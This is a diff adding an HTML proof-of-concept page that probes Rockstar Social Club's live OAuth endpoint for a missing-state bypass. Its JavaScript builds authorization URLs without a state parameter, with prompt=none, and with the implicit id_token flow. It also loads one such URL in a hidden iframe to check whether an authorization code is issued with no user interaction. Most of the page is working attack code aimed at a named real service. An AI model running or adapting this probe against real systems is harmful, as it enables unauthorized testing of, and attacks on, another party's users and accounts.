@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Rockstar OAuth State Bypass PoC</title>
+    <style>
+        body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
+        .log { background: #16213e; padding: 15px; border-radius: 8px; margin: 10px 0; }
+        .vuln { color: #00ff88; }
+        .info { color: #00bfff; }
+        .warn { color: #ffa500; }
+        button { background: #e94560; color: white; border: none; padding: 12px 24px; 
+                 border-radius: 6px; cursor: pointer; font-size: 16px; margin: 5px; }
+        button:hover { background: #ff6b6b; }
+        h1 { color: #e94560; }
+        iframe { display: none; }
+        #results { white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <h1>[PoC] OAuth State Bypass - Rockstar Social Club</h1>
+    
+    <div class="log">
+        <h3>Instructions:</h3>
+        <p>1. Log into <a href="https://socialclub.rockstargames.com" target="_blank" style="color:#00bfff">socialclub.rockstargames.com</a> in this browser first</p>
+        <p>2. Click the buttons below to test silent authorization</p>
+        <p>3. Watch for redirects — if you see a <span class="vuln">code=</span> parameter, the attack works silently</p>
+    </div>
+    
+    <h3>Test 1: Standard OAuth without state (visible redirect)</h3>
+    <button onclick="testVisible()">Test in New Tab</button>
+    
+    <h3>Test 2: Silent via iframe (zero interaction)</h3>
+    <button onclick="testSilent()">Test Silent (iframe)</button>
+    
+    <h3>Test 3: prompt=none (OIDC silent auth)</h3>
+    <button onclick="testPromptNone()">Test prompt=none</button>
+    
+    <h3>Test 4: Implicit flow (token in fragment)</h3>
+    <button onclick="testImplicit()">Test Implicit</button>
+    
+    <div class="log">
+        <h3>Results:</h3>
+        <div id="results"></div>
+    </div>
+    
+    <script>
+        const BASE = "https://signin.rockstargames.com/connect/authorize/socialclub";
+        const REDIRECT = "https://socialclub.rockstargames.com/signin";
+        const results = document.getElementById("results");
+        
+        function addLog(type, msg) {
+            const colors = { vuln: "#00ff88", info: "#00bfff", warn: "#ffa500" };
+            const ts = new Date().toLocaleTimeString();
+            results.innerHTML += `<span style="color:${colors[type] || '#eee'}">[${ts}] ${msg}</span>\n`;
+        }
+        
+        function testVisible() {
+            // Opens in new tab — watch the URL bar for code= parameter
+            const url = `${BASE}?response_type=code&scope=openid&client_id=socialclub&redirect_uri=${encodeURIComponent(REDIRECT)}`;
+            addLog("info", "Opening OAuth URL in new tab...");
+            addLog("info", "URL: " + url);
+            addLog("warn", "WATCH THE URL BAR: if you see code= without a consent screen, it's vulnerable");
+            window.open(url, "_blank");
+        }
+        
+        function testSilent() {
+            // Silent via iframe — true zero-interaction test
+            addLog("info", "Testing silent authorization via hidden iframe...");
+            const url = `${BASE}?response_type=code&scope=openid&client_id=socialclub&redirect_uri=${encodeURIComponent(REDIRECT)}`;
+            
+            const iframe = document.createElement("iframe");
+            iframe.src = url;
+            iframe.style.display = "none";
+            iframe.id = "silent-test";
+            
+            iframe.onload = function() {
+                try {
+                    const iframeUrl = iframe.contentWindow.location.href;
+                    addLog("vuln", "iframe loaded! URL: " + iframeUrl);
+                    if (iframeUrl.includes("code=")) {
+                        addLog("vuln", "*** AUTHORIZATION CODE CAPTURED WITHOUT USER INTERACTION ***");
+                    }
+                } catch(e) {
+                    addLog("info", "iframe cross-origin block (expected) — check Network tab for redirect");
+                }
+            };
+            
+            document.body.appendChild(iframe);
+            addLog("info", "Hidden iframe created. Check DevTools > Network tab for 302 redirect with code=");
+        }
+        
+        function testPromptNone() {
+            addLog("info", "Testing OIDC prompt=none (silent)...");
+            const url = `${BASE}?response_type=code&scope=openid&client_id=socialclub&redirect_uri=${encodeURIComponent(REDIRECT)}&prompt=none`;
+            addLog("info", "URL: " + url);
+            window.open(url, "_blank");
+        }
+        
+        function testImplicit() {
+            addLog("info", "Testing implicit flow (token in URL fragment)...");
+            // Use response_type=token to get token directly in URL
+            const url = `${BASE}?response_type=id_token&scope=openid&client_id=socialclub&redirect_uri=${encodeURIComponent(REDIRECT)}&nonce=abc123`;
+            addLog("info", "URL: " + url);
+            addLog("warn", "If this returns id_token= in # fragment, implicit flow is enabled");
+            window.open(url, "_blank");
+        }
+    </script>
+</body>
+</html>
